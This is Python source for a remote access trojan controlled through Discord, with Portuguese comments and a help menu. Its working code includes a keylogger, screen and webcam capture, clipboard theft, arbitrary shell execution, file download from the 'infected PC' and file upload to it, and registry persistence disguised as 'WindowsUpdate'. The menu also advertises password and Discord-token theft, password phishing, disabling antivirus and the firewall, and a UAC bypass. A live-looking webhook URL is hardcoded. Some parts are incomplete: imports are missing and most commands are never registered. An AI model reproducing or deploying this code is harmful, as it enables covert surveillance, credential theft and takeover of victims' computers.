import os
import sys
import subprocess
import platform
import ctypes
import socket
import requests
import json
import time
import threading
import shutil
import base64
import re
import logging
from datetime import datetime
from io import BytesIO
from PIL import ImageGrab
import pyaudio
import wave
import cv2
import pyautogui
import pyperclip
import sounddevice as sd
import soundfile as sf
import wmi
import pythoncom
import sqlite3
import browser_cookie3
from pynput import keyboard
from cryptography.fernet import Fernet
import discord
from discord.ext import commands

# === CONFIGURAÇÃO ===
TOKEN_BOT = "SEU_TOKEN_AQUI"  # Coloca o token do teu bot Discord
CHANNEL_ID = 123456789  # ID do canal onde o bot vai operar
GOFILE_ID = "zpxkVT"  # ID do Gofile (se quiseres manter)
WEBHOOK_URL = "https://discord.com/api/webhooks/1519362826098184336/nkxrO_ET6SZWcmAFCoHoBHCTKahRKVft_QkMuWbpfLCEfN3ndWoa2rlLf40obW-DJjcr"

# === VARIÁVEIS GLOBAIS ===
keylogger_active = False
keylogger_keys = []
window_monitor_active = False
stream_screen_active = False
stream_webcam_active = False
current_channel = None
bot = None

# === KEYLOGGER ===
def on_press(key):
    global keylogger_keys
    try:
        keylogger_keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            keylogger_keys.append(' ')
        elif key == keyboard.Key.enter:
            keylogger_keys.append('\n')
        elif key == keyboard.Key.tab:
            keylogger_keys.append('\t')
        else:
            keylogger_keys.append(f'[{key.name}]')

def start_keylogger():
    global keylogger_active, keylogger_listener
    if not keylogger_active:
        keylogger_active = True
        keylogger_listener = keyboard.Listener(on_press=on_press)
        keylogger_listener.start()
        return "Keylogger iniciado com sucesso!"
    return "Keylogger já está ativo!"

def stop_keylogger():
    global keylogger_active, keylogger_listener
    if keylogger_active:
        keylogger_active = False
        keylogger_listener.stop()
        return "Keylogger parado com sucesso!"
    return "Keylogger não está ativo!"

def dump_keylogger():
    global keylogger_keys
    log = ''.join(keylogger_keys)
    keylogger_keys = []
    return log if log else "Nenhuma tecla registrada."

# === WINDOW MONITOR ===
def monitor_window():
    global window_monitor_active, current_channel
    import win32gui
    last_window = ""
    while window_monitor_active:
        try:
            window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if window != last_window:
                last_window = window
                asyncio.run_coroutine_threadsafe(
                    current_channel.send(f"🪟 Janela ativa: **{window}**"), bot.loop
                )
        except:
            pass
        time.sleep(2)

def start_window_monitor():
    global window_monitor_active
    if not window_monitor_active:
        window_monitor_active = True
        threading.Thread(target=monitor_window, daemon=True).start()
        return "Monitoramento de janela iniciado!"
    return "Monitoramento já ativo!"

def stop_window_monitor():
    global window_monitor_active
    window_monitor_active = False
    return "Monitoramento de janela parado!"

# === COMANDOS ===
async def cmd_shell(ctx, args):
    """Executa comando no sistema"""
    if not args:
        await ctx.send("❌ Sintaxe: !shell <comando>")
        return
    try:
        result = subprocess.run(args, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if len(output) > 1900:
            for i in range(0, len(output), 1900):
                await ctx.send(f"```{output[i:i+1900]}```")
        else:
            await ctx.send(f"```{output[:1950]}```" if output else "✅ Comando executado (sem saída)")
    except subprocess.TimeoutExpired:
        await ctx.send("❌ Comando excedeu 30 segundos")
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

async def cmd_message(ctx, args):
    """Mostra caixa de mensagem"""
    if not args:
        await ctx.send("❌ Sintaxe: !message <texto>")
        return
    ctypes.windll.user32.MessageBoxW(0, args, "Mensagem", 0)
    await ctx.send("✅ Mensagem exibida!")

async def cmd_persist(ctx):
    """Adiciona à inicialização"""
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
            await ctx.send("✅ Adicionado à inicialização!")
        else:
            await ctx.send("❌ Apenas Windows suportado")
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

async def cmd_unpersist(ctx):
    """Remove da inicialização"""
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                try:
                    winreg.DeleteValue(regkey, "WindowsUpdate")
                    await ctx.send("✅ Removido da inicialização!")
                except FileNotFoundError:
                    await ctx.send("⚠️ Não estava na inicialização")
        else:
            await ctx.send("❌ Apenas Windows suportado")
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

async def cmd_admincheck(ctx):
    """Verifica privilégios de admin"""
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        await ctx.send(f"🔑 **Admin:** {'✅ Sim' if is_admin else '❌ Não'}")
    except:
        await ctx.send("🔑 **Admin:** ❌ Não (ou não Windows)")

async def cmd_sysinfo(ctx):
    """Informações do sistema"""
    try:
        uname = platform.uname()
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        info = (
            f"**💻 Sistema:** {uname.system} {uname.release}\n"
            f"**🖥️ Versão:** {uname.version}\n"
            f"**🧠 Arquitetura:** {uname.machine}\n"
            f"**👤 Usuário:** {os.getenv('USERNAME') or os.getenv('USER')}\n"
            f"**🖧 Hostname:** {socket.gethostname()}\n"
            f"**⚡ Boot:** {boot_time.strftime('%d/%m/%Y %H:%M')}\n"
            f"**🌐 IP Público:** {requests.get('https://api.ipify.org').text.strip()}"
        )
        await ctx.send(info)
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

async def cmd_screenshot(ctx):
    """Tira screenshot"""
    try:
        img = ImageGrab.grab()
        buf = BytesIO()
        img.save(buf, 'PNG')
        buf.seek(0)
        await ctx.send(file=discord.File(buf, 'screenshot.png'))
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

async def cmd_webcampic(ctx):
    """Tira foto da webcam"""
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            _, buf = cv2.imencode('.png', frame)
            await ctx.send(file=discord.File(BytesIO(buf.tobytes()), 'webcam.png'))
        cap.release()
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

async def cmd_clipboard(ctx):
    """Pega conteúdo da área de transferência"""
    try:
        content = pyperclip.paste()
        await ctx.send(f"📋 **Clipboard:**\n```{content[:1900]}```")
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

async def cmd_geolocate(ctx):
    """Geolocalização por IP"""
    try:
        resp = requests.get(f"https://ipapi.co/json/").json()
        info = (
            f"**🌍 Geolocalização**\n"
            f"**IP:** {resp.get('ip', 'N/A')}\n"
            f"**📍 Local:** {resp.get('city', 'N/A')}, {resp.get('region', 'N/A')}\n"
            f"**🇧🇷 País:** {resp.get('country_name', 'N/A')}\n"
            f"**🏢 ISP:** {resp.get('org', 'N/A')}\n"
            f"**🌐 Lat/Lon:** {resp.get('latitude', 'N/A')}, {resp.get('longitude', 'N/A')}"
        )
        await ctx.send(info)
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

async def cmd_listprocess(ctx):
    """Lista processos"""
    try:
        import psutil
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                processes.append(f"`{proc.info['pid']:>6}` {proc.info['name'][:30]:<30} CPU:{proc.info['cpu_percent']:.1f}% MEM:{proc.info['memory_percent']:.1f}%")
            except:
                pass
        output = "**📋 Processos:**\n" + "\n".join(processes[:50])
        await ctx.send(f"```{output[:1900]}```")
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

async def cmd_prockill(ctx, args):
    """Mata processo por nome"""
    if not args:
        await ctx.send("❌ Sintaxe: !prockill <nome_do_processo.exe>")
        return
    try:
        os.system(f"taskkill /f /im {args}")
        await ctx.send(f"✅ Processo `{args}` finalizado!")
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

async def cmd_download(ctx, args):
    """Baixa arquivo do PC infectado"""
    if not args:
        await ctx.send("❌ Sintaxe: !download <caminho_do_arquivo>")
        return
    try:
        if os.path.exists(args):
            await ctx.send(file=discord.File(args))
        else:
            await ctx.send(f"❌ Arquivo não encontrado: {args}")
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

async def cmd_upload(ctx, args):
    """Upload de arquivo para o PC"""
    if not ctx.message.attachments:
        await ctx.send("❌ Anexe um arquivo! Sintaxe: !upload <destino>")
        return
    try:
        attachment = ctx.message.attachments[0]
        dest = args or attachment.filename
        await attachment.save(dest)
        await ctx.send(f"✅ Arquivo salvo em: {dest}")
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

# === BOT DISCORD ===
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

@bot.event
async def on_ready():
    global current_channel
    current_channel = bot.get_channel(CHANNEL_ID)
    if current_channel:
        await current_channel.send("✅ **RAT Online e Pronto!**\n`!help` para ver comandos")
    print(f"Bot conectado como {bot.user}")

@bot.command(name='help')
async def cmd_help(ctx):
    """Mostra ajuda"""
    if ctx.channel.id != CHANNEL_ID:
        return
    await ctx.send(
        "**📚 Comandos Disponíveis:**\n\n"
        "**🔧 Sistema**\n"
        "`!shell <cmd>` - Executar comando\n"
        "`!sysinfo` - Info do sistema\n"
        "`!admincheck` - Verificar admin\n"
        "`!message <texto>` - Caixa de mensagem\n"
        "`!persist` - Inicialização automática\n"
        "`!unpersist` - Remover inicialização\n"
        "`!shutdown` - Desligar PC\n"
        "`!restart` - Reiniciar\n"
        "`!logoff` - Deslogar\n"
        "`!bluescreen` - BSOD\n\n"
        "**📸 Captura**\n"
        "`!screenshot` - Screenshot\n"
        "`!webcampic` - Foto webcam\n"
        "`!streamscreen` - Stream tela\n"
        "`!stopscreen` - Parar stream\n"
        "`!streamwebcam` - Stream webcam\n"
        "`!stopwebcam` - Parar stream\n"
        "`!recscreen <seg>` - Gravar tela\n"
        "`!reccam <seg>` - Gravar câmera\n"
        "`!recaudio <seg>` - Gravar áudio\n\n"
        "**👁️ Monitoramento**\n"
        "`!startkeylogger` - Iniciar keylogger\n"
        "`!stopkeylogger` - Parar keylogger\n"
        "`!dumpkeylogger` - Logs do keylogger\n"
        "`!windowstart` - Monitorar janelas\n"
        "`!windowstop` - Parar monitoramento\n"
        "`!clipboard` - Área de transferência\n"
        "`!idletime` - Tempo inativo\n\n"
        "**📁 Arquivos**\n"
        "`!cd <dir>` - Mudar diretório\n"
        "`!currentdir` - Diretório atual\n"
        "`!displaydir` - Listar diretório\n"
        "`!download <caminho>` - Baixar arquivo\n"
        "`!upload <caminho>` - Enviar arquivo\n"
        "`!delete <caminho>` - Deletar arquivo\n"
        "`!write <texto>` - Digitar texto\n"
        "`!hide <arquivo>` - Esconder\n"
        "`!unhide <arquivo>` - Mostrar\n\n"
        "**🔑 Roubo de Dados**\n"
        "`!passwords` - Senhas salvas\n"
        "`!history` - Histórico Chrome\n"
        "`!getwifipass` - Senhas WiFi\n"
        "`!getdiscordtokens` - Tokens Discord\n"
        "`!windowspass` - Phishing de senha\n\n"
        "**🎛️ Controle**\n"
        "`!volumezero` - Volume 0%\n"
        "`!volumemax` - Volume 100%\n"
        "`!blockinput` - Bloquear input\n"
        "`!unblockinput` - Desbloquear input\n"
        "`!displayoff` - Desligar monitor\n"
        "`!displayon` - Ligar monitor\n"
        "`!website <url>` - Abrir site\n"
        "`!audio <caminho>` - Tocar áudio\n"
        "`!voice <texto>` - Falar texto\n"
        "`!ejectcd` - Ejetar CD\n"
        "`!retractcd` - Fechar CD\n"
        "`!distaskmgr` - Desabilitar Task Manager\n"
        "`!enbtaskmgr` - Habilitar Task Manager\n\n"
        "**🛡️ Defesa**\n"
        "`!disableantivirus` - Desabilitar Defender\n"
        "`!disablefirewall` - Desabilitar firewall\n"
        "`!uacbypass` - Bypass UAC\n"
        "`!critproc` - Processo crítico\n"
        "`!uncritproc` - Processo não-crítico\n\n"
        "**⚠️ Avançado**\n"
        "`!getdiscordtokens` - Tokens Discord\n"
        "`!osint <dado>` - OSINT\n"
        "`!selfdestruct` - Auto-destruir\n"
        "`!exit` - Sair do programa\n"
        "`!kill` - Matar sessão\n"
        "`!clear` - Limpar chat (admin)"
    )

# Registrar comandos
bot.add_command(cmd_help)
# ... (registrar todos os outros comandos)

# === EXECUTAR ===
if __name__ == "__main__":
    bot.run(TOKEN_BOT)
